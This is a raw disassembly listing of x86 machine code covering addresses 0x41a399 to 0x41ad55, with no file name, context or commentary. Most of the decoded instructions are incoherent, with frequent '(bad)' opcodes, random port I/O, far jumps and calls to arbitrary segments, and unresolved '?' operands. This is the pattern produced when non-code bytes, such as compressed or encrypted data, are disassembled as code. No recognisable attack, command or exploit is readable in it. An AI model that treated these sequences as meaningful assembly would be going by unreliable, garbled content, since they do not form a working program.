  41a399:	pop    esi
  41a39a:	jbe    0x41a37c
  41a39c:	jae    0x41a3c9
  41a39e:	subps  xmm1,XMMWORD PTR [ecx-0x4b]
  41a3a2:	scas   al,BYTE PTR es:[edi]
  41a3a3:	jno    0x41a3e2
  41a3a5:	(bad)  
  41a3a6:	jmp    0x41ef5a7b
  41a3ab:	or     BYTE PTR [ecx],bl
  41a3ad:	int    0x4d
  41a3af:	push   cs
  41a3b0:	dec    esp
  41a3b1:	jae    0x41a3bb
  41a3b3:	cmp    BYTE PTR [edx-0x21],dl
  41a3b6:	test   ebp,eax
  41a3b8:	sub    al,0x9b
  41a3ba:	sub    eax,0x23c019b7
  41a3bf:	pop    ecx
  41a3c0:	lds    ecx,FWORD PTR [edx-0x1d]
  41a3c3:	xchg   esp,eax
  41a3c4:	sub    al,0xf
  41a3c6:	push   ss
  41a3c7:	jmp    0xab96bbaf
  41a3cc:	add    BYTE PTR [ebp+0x5e],ah
  41a3cf:	mov    bh,0xf7
  41a3d1:	fst    DWORD PTR [edx-0x6e]
  41a3d4:	xor    dh,cl
  41a3d6:	cmp    ebp,DWORD PTR [ebx]
  41a3d8:	cmp    DWORD PTR [ebx-0x63ee1537],ebx
  41a3de:	push   ebx
  41a3df:	stc    
  41a3e0:	(bad)  
  41a3e2:	enter  0xf4bd,0xcd
  41a3e6:	(bad)  
  41a3e7:	aad    0x3e
  41a3e9:	out    dx,al
  41a3ea:	dec    edx
  41a3eb:	shl    DWORD PTR [ecx+0x54f75f88],0x24
  41a3f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3f3:	jge    0x41a426
  41a3f5:	cdq    
  41a3f6:	mov    edx,0x118f5943
  41a3fb:	sub    al,0x8b
  41a3fd:	int3   
  41a3fe:	aam    0x5f
  41a400:	mov    esi,0x3b5c53b9
  41a405:	fwait
  41a406:	inc    esp
  41a407:	jb     0x41a45d
  41a409:	pop    esp
  41a40a:	mov    ebx,0x6140acff
  41a40f:	retf   
  41a410:	in     eax,0x9f
  41a412:	call   0x750f:0x8e59e343
  41a419:	and    eax,0xd8446489
  41a41e:	rcl    DWORD PTR [ebx],1
  41a420:	jecxz  0x41a3ca
  41a422:	bound  edx,QWORD PTR [ebx-0x7c836af4]
  41a428:	xor    BYTE PTR [edx-0x1],ah
  41a42b:	dec    ch
  41a42d:	(bad)  
  41a42e:	shl    BYTE PTR [edx+0x62523960],1
  41a434:	mov    esi,0xb0834e05
  41a439:	push   esi
  41a43a:	jg     0x41a437
  41a43c:	push   esp
  41a43d:	inc    ebx
  41a43e:	fwait
  41a43f:	rol    ebp,0x86
  41a442:	jl     0x41a4a0
  41a444:	fisubr DWORD PTR [esi+0x7b8015ec]
  41a44a:	dec    esp
  41a44b:	in     al,dx
  41a44c:	mov    ah,0xb4
  41a44e:	stc    
  41a44f:	es aaa 
  41a451:	imul   ecx,DWORD PTR [edx+0xd8808a5],0x9b4763cc
  41a45b:	(bad)  
  41a45c:	fcom   DWORD PTR [edi+0x70]
  41a45f:	imul   edi,ebp,0xa1217d27
  41a465:	test   ch,al
  41a467:	out    dx,eax
  41a468:	ret    
  41a469:	pushw  ss
  41a46b:	out    dx,al
  41a46c:	in     al,dx
  41a46d:	iret   
  41a46e:	aam    0xb0
  41a470:	pushf  
  41a471:	stos   DWORD PTR es:[edi],eax
  41a472:	adc    eax,0x1f791afe
  41a477:	int    0x5e
  41a479:	frstor [ebx+0x2c]
  41a47c:	mov    ah,0xe9
  41a47e:	jge    0x41a4de
  41a480:	xchg   esp,eax
  41a481:	fnstsw WORD PTR [eax]
  41a483:	mov    bl,0x45
  41a485:	idiv   DWORD PTR [esi]
  41a487:	fsub   DWORD PTR [esp+ebx*2]
  41a48a:	retf   0x831a
  41a48d:	vhsubps xmm1,xmm3,XMMWORD PTR [eax+eax*1]
	...
  41a4f2:	add    BYTE PTR [eax],al
  41a4f4:	mov    edi,0xff0fcf82
  41a4f9:	dec    edi
  41a4fa:	push   DWORD PTR [edx+0x5f4d0d09]
  41a500:	mov    edx,0x30b56228
  41a505:	pop    ss
  41a506:	add    DWORD PTR [eax],eax
  41a508:	add    eax,0x36000001
  41a50d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a50e:	sub    al,0x3a
  41a510:	push   edx
  41a511:	xchg   esp,eax
  41a512:	sub    ecx,esp
  41a514:	inc    esi
  41a515:	jg     0x41a561
  41a517:	(bad)  
  41a518:	lds    esp,FWORD PTR [ebx-0x6f]
  41a51b:	scas   al,BYTE PTR es:[edi]
  41a51c:	xor    eax,eax
  41a51e:	jg     0x41a54d
  41a520:	and    al,BYTE PTR [edi-0x668a266c]
  41a526:	and    DWORD PTR [eax*4+0x62eba34d],0x4e
  41a52e:	dec    edx
  41a52f:	push   ebx
  41a530:	mov    bh,0x6a
  41a532:	daa    
  41a533:	pop    es
  41a534:	push   0x7eeaa5e
  41a539:	push   edi
  41a53a:	fwait
  41a53b:	call   0x462a:0xd291c0d2
  41a542:	cmp    ah,BYTE PTR [ecx]
  41a544:	sub    ecx,ebp
  41a546:	add    eax,0x6e12c41f
  41a54b:	pusha  
  41a54c:	ds (bad) 
  41a54e:	mov    eax,0xcd226f27
  41a553:	dec    esp
  41a554:	not    BYTE PTR [edi]
  41a556:	or     DWORD PTR [edx],edi
  41a558:	xlat   BYTE PTR ds:[ebx]
  41a559:	loope  0x41a59d
  41a55b:	in     eax,0x0
  41a55d:	mov    ch,0x5f
  41a55f:	fbstp  TBYTE PTR [edi-0x62421e72]
  41a565:	in     al,0xa4
  41a567:	fisttp WORD PTR fs:[edi-0x40bf2d6a]
  41a56e:	push   0x3f
  41a570:	cmp    al,0x7b
  41a572:	dec    ecx
  41a573:	mov    ah,BYTE PTR [ebp+0x2c]
  41a576:	push   cs
  41a577:	ins    BYTE PTR es:[edi],dx
  41a578:	mov    esp,DWORD PTR [ecx]
  41a57a:	add    dh,BYTE PTR [edi]
  41a57c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a57d:	not    BYTE PTR [esi+ebx*4+0x11]
  41a581:	dec    ebp
  41a582:	push   esi
  41a583:	mov    esp,0x47ab876d
  41a588:	mov    gs,eax
  41a58a:	xchg   esi,eax
  41a58b:	jo     0x41a59a
  41a58d:	sbb    eax,0x68312797
  41a592:	fucomip st,st(6)
  41a594:	and    BYTE PTR [edx],dh
  41a596:	loope  0x41a549
  41a598:	push   cs
  41a599:	enter  0x4762,0x8a
  41a59d:	and    BYTE PTR [ebp+0x3aa2918b],dl
  41a5a3:	sar    BYTE PTR [edi+0x68],1
  41a5a6:	or     DWORD PTR [ecx+eax*1-0x153561d9],edx
  41a5ad:	cmc    
  41a5ae:	cli    
  41a5af:	pop    ds
  41a5b0:	add    al,0x36
  41a5b2:	pushf  
  41a5b3:	xchg   DWORD PTR [eax*4+0x6f2c336],edx
  41a5ba:	stos   BYTE PTR es:[edi],al
  41a5bb:	and    al,0x7e
  41a5bd:	lock and DWORD PTR [ebp+0x163a39e4],ecx
  41a5c4:	inc    eax
  41a5c5:	imul   edx,DWORD PTR [ecx],0x7c
  41a5c8:	jg     0x41a61d
  41a5ca:	ficom  WORD PTR [esp+ebx*1+0x4]
  41a5ce:	mov    ebx,0x4a6c676e
  41a5d3:	cmc    
  41a5d4:	xor    esi,DWORD PTR [edx]
  41a5d6:	pop    eax
  41a5d7:	jns    0x41a5f4
  41a5d9:	mov    bl,BYTE PTR [ecx+esi*8-0x16906bce]
  41a5e0:	je     0x41a65f
  41a5e2:	in     al,dx
  41a5e3:	xchg   esi,eax
  41a5e4:	jmp    0x2b5261c6
  41a5e9:	sub    eax,0xf8072572
  41a5ee:	stc    
  41a5ef:	aas    
  41a5f0:	popf   
  41a5f1:	rcl    dh,cl
  41a5f3:	shl    DWORD PTR [ebx],cl
  41a5f5:	jg     0xf6a5fb37
  41a5fb:	pop    esi
  41a5fc:	ret    0x5a5f
  41a5ff:	cwde   
  41a600:	lock jmp 0x41a61f
  41a603:	dec    esi
  41a604:	xchg   ebx,eax
  41a605:	mov    al,0xaf
  41a607:	aam    0x1b
  41a609:	inc    edi
  41a60a:	cdq    
  41a60b:	aam    0x36
  41a60d:	div    DWORD PTR [eax-0x2d]
  41a610:	outs   dx,BYTE PTR ds:[esi]
	...
  41a671:	add    BYTE PTR [eax],al
  41a673:	add    BYTE PTR [edx+ebp*1+0x1],bl
  41a677:	inc    ecx
  41a678:	ja     0x41a6e5
  41a67a:	pop    esp
  41a67b:	aas    
  41a67c:	dec    ecx
  41a67d:	push   0x91d9a625
  41a682:	cwde   
  41a683:	pop    ebp
  41a684:	xor    eax,0x5000118
  41a689:	add    DWORD PTR [eax],eax
  41a68b:	add    BYTE PTR [edi],al
  41a68d:	icebp  
  41a68e:	pushf  
  41a68f:	imul   edx,edi,0x632fa075
  41a695:	cli    
  41a696:	neg    BYTE PTR [edx+0x29]
  41a699:	pop    ds
  41a69a:	loop   0x41a63e
  41a69c:	mov    gs,esp
  41a69e:	(bad)  
  41a69f:	and    esp,eax
  41a6a1:	lahf   
  41a6a2:	fdiv   st,st(0)
  41a6a4:	xchg   edx,eax
  41a6a5:	jo     0x41a64f
  41a6a7:	lds    edi,FWORD PTR [ecx]
  41a6a9:	jns    0x41a680
  41a6ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6ac:	adc    DWORD PTR [ebx-0xa9c5c9f],eax
  41a6b2:	rcl    edx,cl
  41a6b4:	jno    0x41a716
  41a6b6:	push   ecx
  41a6b7:	div    DWORD PTR [ebp-0x5a82146]
  41a6bd:	xor    ebp,eax
  41a6bf:	fidiv  DWORD PTR [esi]
  41a6c1:	mov    eax,ds:0x884d80b5
  41a6c6:	shl    BYTE PTR [ebx+0x23d05fbb],cl
  41a6cc:	cmp    BYTE PTR [edi+0xb],bh
  41a6cf:	mov    ds:0x6961ed89,al
  41a6d4:	mov    ebx,0xe9b85fe3
  41a6d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6da:	push   ds
  41a6db:	push   ds
  41a6dc:	add    eax,0x6e405f82
  41a6e1:	mov    eax,0xaf5d32b6
  41a6e6:	cmp    eax,0x6b7a9727
  41a6eb:	inc    esp
  41a6ec:	aam    0x6a
  41a6ee:	mov    ah,0x3d
  41a6f0:	imul   ebp,DWORD PTR [esi-0x2a],0x20
  41a6f4:	outs   dx,BYTE PTR ds:[esi]
  41a6f5:	fistp  DWORD PTR [eax]
  41a6f7:	pop    ebx
  41a6f8:	inc    ebp
  41a6f9:	adc    bh,0xf8
  41a6fc:	pop    ebx
  41a6fd:	jnp    0x41a692
  41a6ff:	push   ss
  41a700:	push   esp
  41a701:	jmp    0x41a742
  41a703:	icebp  
  41a704:	les    ebp,FWORD PTR [ecx+eax*4-0x1]
  41a708:	retf   0x2f2e
  41a70b:	test   BYTE PTR [ecx+0x488dad53],ch
  41a711:	mov    eax,0xd404cbd4
  41a716:	iret   
  41a717:	pop    eax
  41a718:	ins    DWORD PTR es:[edi],dx
  41a719:	pushf  
  41a71a:	ins    BYTE PTR es:[edi],dx
  41a71b:	or     BYTE PTR [eax+0x33],0x8d
  41a71f:	and    al,0x9e
  41a721:	mov    esp,0xbaab58cb
  41a726:	test   bh,dh
  41a728:	(bad)
  41a72b:	aam    0x18
  41a72d:	adc    al,0x4f
  41a72f:	dec    esp
  41a730:	cmp    cl,BYTE PTR [ebx+0x1811779d]
  41a736:	jb     0x41a735
  41a738:	and    eax,0x8dac8ded
  41a73d:	push   esi
  41a73e:	jne    0x41a7b3
  41a740:	and    al,0x9c
  41a742:	test   al,0x16
  41a744:	and    eax,0xa6a5ba3b
  41a749:	sahf   
  41a74a:	pop    es
  41a74b:	mov    ds:0xa57ec741,al
  41a750:	outs   dx,BYTE PTR ds:[esi]
  41a751:	inc    ebp
  41a752:	add    bh,BYTE PTR [eax+0x13ae26c]
  41a758:	xor    eax,0x5f84e302
  41a75d:	sbb    ecx,DWORD PTR [ecx]
  41a75f:	or     eax,DWORD PTR [ecx+0x3e1e8cc7]
  41a765:	loope  0x41a6ff
  41a767:	push   cs
  41a768:	ficom  DWORD PTR [esi]
  41a76a:	xchg   edx,eax
  41a76b:	std    
  41a76c:	mov    ch,cl
  41a76e:	jae    0x41a7d6
  41a770:	mov    esi,0x25057d6c
  41a775:	sti    
  41a776:	out    0x58,al
  41a778:	loopne 0x41a778
  41a77a:	push   ecx
  41a77b:	lds    ebp,FWORD PTR [esi+0x18]
  41a77e:	cmp    ah,BYTE PTR [ebx-0x60]
  41a781:	push   cs
  41a782:	cdq    
  41a783:	cld    
  41a784:	sub    eax,0x284c4661
  41a789:	dec    ebx
  41a78a:	jmp    0x7528434c
  41a78f:	(bad)  
  41a790:	pop    ss
	...
  41a7f1:	add    BYTE PTR [eax],al
  41a7f3:	add    bl,dh
  41a7f5:	xchg   edi,eax
  41a7f6:	jae    0x41a77f
  41a7f8:	ja     0x41a7e1
  41a7fa:	div    edi
  41a7fc:	mov    ds:0xa45327ca,al
  41a801:	in     eax,dx
  41a802:	pop    edi
  41a803:	xchg   ecx,eax
  41a804:	cmp    bl,BYTE PTR [ecx]
  41a806:	add    DWORD PTR [eax],eax
  41a808:	add    eax,0x6b000001
  41a80d:	cwde   
  41a80e:	jmp    0x41a86c
  41a810:	xor    edx,DWORD PTR [esi+0x63]
  41a813:	mov    ?,WORD PTR [ecx]
  41a815:	cld    
  41a816:	dec    edx
  41a817:	fs out dx,eax
  41a819:	int    0xf6
  41a81b:	aam    0x86
  41a81d:	fadd   DWORD PTR ds:0x83427134
  41a823:	push   esp
  41a824:	or     DWORD PTR [edx+0x8ef862e],0xffffffad
  41a82b:	sub    BYTE PTR [esi-0x47],bh
  41a82e:	jnp    0x41a7c4
  41a830:	jmp    0x41a7cf
  41a832:	xchg   ecx,eax
  41a833:	fdiv   QWORD PTR [eax+0x5d]
  41a836:	xor    eax,0x6c1e8def
  41a83b:	call   0x5cf6:0x14cba508
  41a842:	mov    ah,0x54
  41a844:	(bad)
  41a847:	jno    0x41a80b
  41a849:	adc    al,0x89
  41a84b:	mov    dl,0x14
  41a84d:	cmp    BYTE PTR [ebx-0x371b07c2],bl
  41a853:	sbb    BYTE PTR [esi-0x1],al
  41a856:	leave  
  41a857:	jno    0x41a868
  41a859:	dec    eax
  41a85a:	jne    0x41a860
  41a85c:	and    BYTE PTR [eax+0x7b],0xd5
  41a860:	push   ecx
  41a861:	shl    BYTE PTR [ecx+ebp*8-0x6c],0xe9
  41a866:	mov    ?,eax
  41a868:	cmp    eax,0x563f7da4
  41a86d:	dec    DWORD PTR [edx]
  41a86f:	cwde   
  41a870:	js     0x41a8db
  41a872:	and    al,0xbc
  41a874:	pushf  
  41a875:	aam    0x7f
  41a877:	out    0x87,eax
  41a879:	cld    
  41a87a:	movups XMMWORD PTR [eax+0x76ef931f],xmm7
  41a881:	xlat   BYTE PTR ds:[ebx]
  41a882:	add    DWORD PTR [edi-0x70],eax
  41a885:	inc    ecx
  41a886:	push   0x1310c1de
  41a88b:	jae    0x41a853
  41a88d:	sub    DWORD PTR [edi+esi*4-0x36],eax
  41a891:	out    dx,al
  41a892:	fmul   DWORD PTR [ebp+0x322debc3]
  41a898:	push   cs
  41a899:	addr16 pop ecx
  41a89b:	inc    edx
  41a89c:	mov    eax,0x2d1db92b
  41a8a1:	test   BYTE PTR [esi+edi*8],bh
  41a8a4:	test   BYTE PTR [ecx+esi*1+0x19],cl
  41a8a8:	and    BYTE PTR [ecx],ah
  41a8aa:	mov    eax,ds:0x372c4394
  41a8af:	mov    bl,0x6b
  41a8b1:	or     eax,eax
  41a8b3:	loop   0x41a88b
  41a8b5:	xor    BYTE PTR [ebx],dl
  41a8b7:	xor    cl,BYTE PTR [ebx-0x2590504a]
  41a8bd:	xor    DWORD PTR [edi+0x4183303d],edi
  41a8c3:	out    0xf1,al
  41a8c5:	jo     0x41a93f
  41a8c7:	retf   
  41a8c8:	pushf  
  41a8c9:	or     eax,0xa0b28baf
  41a8ce:	inc    DWORD PTR [esi]
  41a8d0:	repz in eax,dx
  41a8d2:	in     al,0x3b
  41a8d4:	sub    eax,0xf5ca548b
  41a8d9:	mov    ebp,0x564a882d
  41a8de:	ror    edi,cl
  41a8e0:	xchg   esp,eax
  41a8e1:	(bad)  
  41a8e2:	outs   dx,DWORD PTR ds:[esi]
  41a8e3:	fdivr  DWORD PTR [edi]
  41a8e5:	rol    DWORD PTR [esi+0x31],0x1a
  41a8e9:	cmp    BYTE PTR [ebx],cl
  41a8eb:	(bad)  
  41a8ec:	inc    esi
  41a8ed:	cli    
  41a8ee:	sub    BYTE PTR [eax+eax*8],0xa
  41a8f2:	lds    esi,FWORD PTR [esi]
  41a8f4:	xchg   ecx,eax
  41a8f5:	pop    es
  41a8f6:	sub    edi,edx
  41a8f8:	dec    edi
  41a8f9:	pushf  
  41a8fa:	and    BYTE PTR [ecx],dh
  41a8fc:	push   ds
  41a8fd:	imul   ebx,DWORD PTR [eax+0x7b],0xa3abf126
  41a904:	cmc    
  41a905:	daa    
  41a906:	in     eax,0x6
  41a908:	loop   0x41a926
  41a90a:	ds (bad) 
  41a90c:	fidivr DWORD PTR [edx+0xb62b2f]
	...
  41a972:	add    BYTE PTR [eax],al
  41a974:	xor    eax,0xcf4a867e
  41a979:	cli    
  41a97a:	std    
  41a97b:	jg     0x41a9cb
  41a97d:	push   edx
  41a97e:	pushf  
  41a97f:	dec    esp
  41a980:	xor    eax,0x3f600394
  41a985:	sbb    al,BYTE PTR [ecx]
  41a987:	add    BYTE PTR ds:0xb6000001,al
  41a98d:	sub    BYTE PTR [ebp-0x74704d7a],dl
  41a993:	and    BYTE PTR [ecx],bl
  41a995:	inc    esi
  41a996:	jne    0x41a976
  41a998:	mov    bl,0x5d
  41a99a:	or     esi,DWORD PTR [edi-0x58]
  41a99d:	call   0xc66b851
  41a9a2:	(bad)  
  41a9a3:	jmp    0xcb636167
  41a9a8:	dec    esp
  41a9a9:	mov    ah,BYTE PTR [edx-0x41]
  41a9ac:	jne    0x41a973
  41a9ae:	(bad)  
  41a9af:	call   0x936d:0xd4c9bf67
  41a9b6:	hlt    
  41a9b7:	test   eax,0x92bf483d
  41a9bc:	jle    0x41a9d0
  41a9be:	mov    edi,0x4f288068
  41a9c3:	inc    ecx
  41a9c4:	jge    0x41a9aa
  41a9c6:	mov    bl,0x5c
  41a9c8:	ja     0x41a9cf
  41a9ca:	stos   DWORD PTR es:[edi],eax
  41a9cb:	mov    BYTE PTR ds:[eax+0x47ba5713],bl
  41a9d2:	call   0x58ab97e7
  41a9d7:	retf   
  41a9d8:	(bad)  
  41a9d9:	jo     0x41a9fb
  41a9db:	push   edi
  41a9dc:	das    
  41a9dd:	pusha  
  41a9de:	jb     0x41a9a6
  41a9e0:	and    al,0xc3
  41a9e2:	mov    ch,0x1
  41a9e4:	je     0x41aa41
  41a9e6:	xchg   edx,eax
  41a9e7:	sbb    al,0x2e
  41a9e9:	gs aam 0xfa
  41a9ec:	popa   
  41a9ed:	retf   0x2042
  41a9f0:	gs pop esp
  41a9f2:	icebp  
  41a9f3:	xor    ah,al
  41a9f5:	lods   al,BYTE PTR ds:[esi]
  41a9f6:	add    DWORD PTR [ebx-0x149a024b],ecx
  41a9fc:	test   BYTE PTR [ebx],0x28
  41a9ff:	(bad)  
  41aa00:	hlt    
  41aa01:	push   esi
  41aa02:	lock das 
  41aa04:	add    esp,eax
  41aa06:	les    edx,FWORD PTR ds:0xff33a3b4
  41aa0c:	fbstp  TBYTE PTR [eax-0x6e159533]
  41aa12:	mov    eax,ds:0xfcf962eb
  41aa17:	pop    esi
  41aa18:	test   ebx,ebp
  41aa1a:	test   eax,0x7b405102
  41aa1f:	mov    edi,0x52830949
  41aa24:	bound  ecx,QWORD PTR [ebp-0x7e]
  41aa27:	xchg   ebp,eax
  41aa28:	lods   eax,DWORD PTR ds:[esi]
  41aa29:	frstor [ebx+0xd93d4a4]
  41aa2f:	(bad)  [eax+0x17416946]
  41aa35:	jae    0x41aa3e
  41aa37:	inc    esp
  41aa38:	add    al,0xc5
  41aa3a:	ret    
  41aa3b:	jbe    0x41a9fe
  41aa3d:	outs   dx,DWORD PTR ds:[esi]
  41aa3e:	mov    ds:0xf31f7383,eax
  41aa43:	sbb    al,0xbd
  41aa45:	fnstcw WORD PTR [edx]
  41aa47:	enter  0x2a38,0xc2
  41aa4b:	mov    esi,0xf5490e3f
  41aa50:	inc    edi
  41aa51:	(bad)  
  41aa52:	pop    eax
  41aa53:	adc    eax,DWORD PTR [ebx+0xb]
  41aa56:	mov    al,0x30
  41aa58:	xor    eax,0x48d07e7b
  41aa5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa5e:	std    
  41aa5f:	aaa    
  41aa60:	dec    esi
  41aa61:	pop    ebp
  41aa62:	addr16 push ss
  41aa64:	ds int 0xa4
  41aa67:	call   0x3998:0x10408308
  41aa6e:	bound  esp,QWORD PTR [edx-0x51]
  41aa71:	push   es
  41aa72:	cmp    ebp,DWORD PTR [eax-0x6473f10b]
  41aa78:	fistp  WORD PTR [ebp+0x4b]
  41aa7b:	es fdivr st,st(1)
  41aa7e:	cmp    BYTE PTR [bp+si-0x3c],ah
  41aa82:	inc    eax
  41aa83:	iret   
  41aa84:	mov    esp,0x7dd8906c
  41aa89:	jge    0x41aa46
  41aa8b:	loopne 0x41aa80
  41aa8d:	cmp    DWORD PTR [edx],esi
  41aa8f:	shr    DWORD PTR [ebx],0x0
	...
  41aaf2:	add    BYTE PTR [eax],al
  41aaf4:	test   DWORD PTR [ecx],0xfdfeb4dc
  41aafa:	inc    DWORD PTR [ebx+0x5f]
  41aafd:	sbb    BYTE PTR [esi+0x43],ah
  41ab00:	inc    edi
  41ab01:	jmp    0x1b869564
  41ab06:	add    DWORD PTR [eax],eax
  41ab08:	add    eax,0xe000001
  41ab0d:	cdq    
  41ab0e:	imul   edx,ecx,0xa315caf4
  41ab14:	inc    esp
  41ab15:	cmp    al,0x5a
  41ab17:	call   0xda20ed91
  41ab1c:	scas   al,BYTE PTR es:[edi]
  41ab1d:	imul   edx,DWORD PTR [ebp+0x7d305cd6],0x250ae8d8
  41ab27:	xchg   ecx,eax
  41ab28:	and    esi,DWORD PTR [esp+edi*8-0x44868beb]
  41ab2f:	lods   al,BYTE PTR ds:[esi]
  41ab30:	dec    ebp
  41ab31:	and    DWORD PTR ds:0xe060117c,ebp
  41ab37:	ficomp DWORD PTR [eax]
  41ab39:	pop    ebp
  41ab3a:	pop    ebp
  41ab3b:	push   edx
  41ab3c:	xor    eax,0x87db3486
  41ab41:	cmp    al,0x5c
  41ab43:	mov    al,ds:0x80fbf301
  41ab48:	(bad)  
  41ab49:	xchg   esp,eax
  41ab4a:	inc    ecx
  41ab4b:	aaa    
  41ab4c:	jmp    0xbddb:0x549af211
  41ab53:	dec    edx
  41ab54:	add    ecx,DWORD PTR [edx+0x44]
  41ab57:	mov    ecx,edi
  41ab59:	cmp    al,0x83
  41ab5b:	mov    ah,0x94
  41ab5d:	or     bl,0xcb
  41ab60:	push   eax
  41ab61:	or     DWORD PTR [eax+ebp*4],eax
  41ab64:	test   al,0xf4
  41ab66:	aas    
  41ab67:	push   edx
  41ab68:	jne    0x41abcb
  41ab6a:	dec    ecx
  41ab6b:	xchg   esp,eax
  41ab6c:	fwait
  41ab6d:	cmp    ecx,DWORD PTR [eax]
  41ab6f:	add    esi,DWORD PTR [edx]
  41ab71:	xor    ebp,ebp
  41ab73:	loopne 0x41abde
  41ab75:	fcmovne st,st(0)
  41ab77:	repnz mov ds:0xe1c48d58,al
  41ab7d:	fcom   QWORD PTR [ecx*1-0x1ae2f71b]
  41ab84:	cmp    BYTE PTR ds:0xb8a5197d,ah
  41ab8a:	pop    ss
  41ab8b:	lds    ebx,FWORD PTR [ebx+0x2d]
  41ab8e:	xlat   BYTE PTR ds:[ebx]
  41ab8f:	aaa    
  41ab90:	popa   
  41ab91:	cmp    al,bh
  41ab93:	out    0xaf,al
  41ab95:	es push es
  41ab97:	jp     0x41ab9e
  41ab99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab9a:	rcr    DWORD PTR [edi+0x213e5c0],1
  41aba0:	popa   
  41aba1:	rcl    DWORD PTR [ebp+0x17],cl
  41aba4:	sbb    BYTE PTR [ecx],bh
  41aba6:	pushf  
  41aba7:	sub    BYTE PTR [edx+0x19],dl
  41abaa:	or     DWORD PTR [edi],edx
  41abac:	dec    eax
  41abad:	jle    0x41abad
  41abaf:	aam    0xed
  41abb1:	add    cl,BYTE PTR [eax-0xa]
  41abb4:	mov    ebx,0x55255e29
  41abb9:	mov    ds:0x2d7465d2,eax
  41abbe:	arpl   ax,ax
  41abc0:	jle    0x41ac02
  41abc2:	(bad)  
  41abc4:	push   es
  41abc5:	and    al,0xe9
  41abc7:	xor    BYTE PTR [ebx+eiz*4-0x144ae26],ah
  41abce:	loop   0x41ab90
  41abd0:	jmp    0xde5a:0xb3c12dc2
  41abd7:	inc    ebx
  41abd8:	mov    ch,0xf3
  41abda:	cmp    DWORD PTR [ebx],edi
  41abdc:	push   edi
  41abdd:	mov    bh,0x29
  41abdf:	outs   dx,BYTE PTR ds:[esi]
  41abe0:	call   0x61ed28a7
  41abe5:	cli    
  41abe6:	outs   dx,BYTE PTR ds:[esi]
  41abe7:	popf   
  41abe8:	cld    
  41abe9:	xchg   esp,eax
  41abea:	cmp    eax,0x6b1f6e35
  41abef:	aas    
  41abf0:	push   edx
  41abf1:	sbb    al,0xf3
  41abf3:	cmc    
  41abf4:	(bad)  
  41abf5:	call   FWORD PTR [edi+0x35]
  41abf8:	xlat   BYTE PTR ds:[ebx]
  41abf9:	jg     0x41abfe
  41abfb:	outs   dx,DWORD PTR ds:[esi]
  41abfc:	loopne 0x41abe2
  41abfe:	mul    BYTE PTR [edx-0x21]
  41ac01:	test   eax,0xb94053ce
  41ac06:	hlt    
  41ac07:	in     al,dx
  41ac08:	sub    al,0x37
  41ac0a:	mov    ds:0xd1ee2076,al
  41ac0f:	out    0x46,al
	...
  41ac71:	add    BYTE PTR [eax],al
  41ac73:	add    BYTE PTR [edx+0x49],ch
  41ac76:	es cmp al,0x27
  41ac79:	jg     0x41acf5
  41ac7b:	pop    edi
  41ac7c:	or     al,0x44
  41ac7e:	xor    ah,BYTE PTR [eax+ebp*4-0x6d]
  41ac82:	add    DWORD PTR [ecx+ecx*2],0x1c
  41ac86:	add    DWORD PTR [eax],eax
  41ac88:	add    eax,0xea000001
  41ac8d:	push   ebp
  41ac8e:	xchg   DWORD PTR [edx],edx
  41ac90:	clc    
  41ac91:	add    BYTE PTR [edi-0x1970eebb],ch
  41ac97:	mov    cl,0x98
  41ac99:	mov    al,0x78
  41ac9b:	or     eax,0x812f049c
  41aca0:	and    DWORD PTR [ecx-0x43],esp
  41aca3:	(bad)  [esi+0x51]
  41aca6:	outs   dx,BYTE PTR ds:[esi]
  41aca7:	xor    BYTE PTR [eax-0x657b34f3],bl
  41acad:	push   0xea5652ff
  41acb2:	aad    0x87
  41acb4:	aaa    
  41acb5:	cmp    ah,bl
  41acb7:	jbe    0x41ad32
  41acb9:	in     al,0x7d
  41acbb:	mov    ebp,0xca20ff9f
  41acc0:	lahf   
  41acc1:	loope  0x41ac87
  41acc3:	adc    dl,BYTE PTR [edx]
  41acc5:	(bad)  
  41acc6:	mov    eax,ds:0x1d54c685
  41accb:	push   ebp
  41accc:	mov    bl,0x26
  41acce:	gs (bad) 
  41acd0:	stos   DWORD PTR es:[edi],eax
  41acd1:	leave  
  41acd2:	or     BYTE PTR [ebp+0x2f],bl
  41acd5:	retf   
  41acd6:	ret    0x7c6f
  41acd9:	jge    0x41ac94
  41acdb:	mov    bl,0xce
  41acdd:	inc    edi
  41acde:	test   BYTE PTR [ebx+0x19],dh
  41ace1:	test   al,0x0
  41ace3:	mov    cl,0x21
  41ace5:	and    DWORD PTR ds:0x14a34e2a,ecx
  41aceb:	mov    ecx,0xde8473e3
  41acf0:	mov    al,ds:0xb7696885
  41acf5:	dec    esi
  41acf6:	mov    ch,0x51
  41acf8:	test   al,0x84
  41acfa:	popf   
  41acfb:	add    ecx,DWORD PTR [ebx+0x1e269c86]
  41ad01:	int3   
  41ad02:	pop    edi
  41ad03:	aaa    
  41ad04:	repnz imul DWORD PTR [ebx-0x49]
  41ad08:	fwait
  41ad09:	aad    0x7c
  41ad0b:	sub    dl,dh
  41ad0d:	xor    edi,ebp
  41ad0f:	pop    edx
  41ad10:	and    al,0x61
  41ad12:	xor    DWORD PTR [ecx+0x5b],ecx
  41ad15:	dec    ebx
  41ad16:	xchg   ebp,eax
  41ad17:	test   BYTE PTR [eax-0x4f77f34a],al
  41ad1d:	aaa    
  41ad1e:	sub    bl,dh
  41ad20:	ins    DWORD PTR es:[edi],dx
  41ad21:	dec    eax
  41ad22:	mov    esp,0xdc878592
  41ad27:	or     esi,ecx
  41ad29:	lods   eax,DWORD PTR ds:[esi]
  41ad2a:	daa    
  41ad2b:	inc    edi
  41ad2c:	std    
  41ad2d:	mov    ebp,0xda86e8c4
  41ad32:	push   cs
  41ad33:	mov    edi,0x6c4cd107
  41ad38:	and    edx,edx
  41ad3a:	mov    esi,0x9b2b5fb0
  41ad3f:	xor    eax,DWORD PTR [esi]
  41ad41:	push   ebx
  41ad42:	jecxz  0x41ad89
  41ad44:	std    
  41ad45:	(bad)  
  41ad46:	pop    ebp
  41ad47:	outs   dx,BYTE PTR cs:[esi]
  41ad49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad4a:	and    eax,0xa4519f8e
  41ad4f:	int3   
  41ad50:	and    eax,0x837202c8
  41ad55:	push   ds
